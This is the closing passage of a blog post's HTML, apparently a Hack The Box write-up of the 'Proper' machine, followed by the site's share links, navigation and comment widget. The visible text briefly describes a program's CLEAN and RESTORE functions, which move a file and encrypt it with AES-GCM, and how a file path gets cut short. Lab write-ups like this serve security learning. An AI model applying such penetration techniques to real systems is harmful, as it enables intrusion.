+<p>Something’s not right. One character is truncated. In any case, all I have to do is to add one more character behind the path. Well, this is what happened. CLEAN removes the file specified in the file path and move it to C: and its content encrypted with AES-GCM.</p>
+<img src="/2021/07/11/Hackthebox/Hackthebox-Proper/image16.png" class>
+
+<p>Conversely, RESTORE restores the file back to the original file path by decrypting the file contents and decoding the file path.</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/&title=《Proper - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/&title=《Proper - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Proper - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2021/07/12/Hackthebox/Hackthebox-Seal/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Seal - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2021/07/07/Hackthebox/Hackthebox-Intelligence/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Intelligence - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/&title=《Proper - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/&title=《Proper - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Proper - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/07/11/Hackthebox/Hackthebox-Proper/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACxElEQVR42u3aS27DMAwFwN7/0inQdSU/klKTAuNVkY+lUQCTJfn1FV+vn2v1+urd/Wdei2u14n6V0YWHh4fX2nqy2Ord1Sb2sD2jt59fdoWHh4d3jZdvtPqIz4PE5FCWr+Ph4eG9lVdNbfOkObknHh4e3n/n9YoFvWPCw8PD+0xetajaS5STFZPgcaXWgoeHhxfzJg/ld/19sb+Hh4eHN+iqn213Ja2s3n2W98fDw8O7wNs3t5I0Og8k++0mbbY8CjyEBzw8PLwBbzIQMA8nvZQ6+RmWcQ8PDw9vzOsltZN0uVcUzo/vITzg4eHhjXnVNDehzovF0W+SDBDg4eHhXeBVSwB5g786HJC8kuyksGk8PDy8MS8vwlbLr9X2fzXhflgFDw8P7yhvUixIihG9ZL0KfihG4OHh4R3l5e2oaqss30pyfNWgVe624eHh4cW8arJbJfXGqpp9vH2VGg8PD+8QL3kcJ0XYXrMqv3OeuOPh4eF9Ai9PeauP8knAqAYSPDw8vFO83pLVQYFTTbL9Hpb/MeDh4eFd4OVfqJZxq5ueDCssAwMeHh7eUd7osTso/iZ3zgvHeHh4eH/Jqz7E8xb+5Dh6bbPlTBkeHh7eUV7eiKoWKU6NF0yGuvDw8PDu8QoN+GIjKv989VB6STkeHh7eDd5k3KpX9q0WfPOGHB4eHt4NXi+Nzh/NvWJHHkKiWgseHh7eNV7ekh/l6a2ibW+UAQ8PD+8Gb/KFJJBUE+Ib4wh4eHh4Z3mv4lXdaHK68wJHoRiBh4eHd6GMe7ZAkCfr83LGgekJPDw8vJh3KhhUR6xu3x8PDw/vNq9Zw2gFjzmjOWiFh4eH9+e8fOG8QJAkx3mYWba+8PDw8N7Ky0uueRo9CS0PR4mHh4d3jZcXI6pF1d6IVXWt5St4eHh4F3i9wabq+FTe7K8eQRmDh4eH1+d9A5ueu2CnlzTOAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
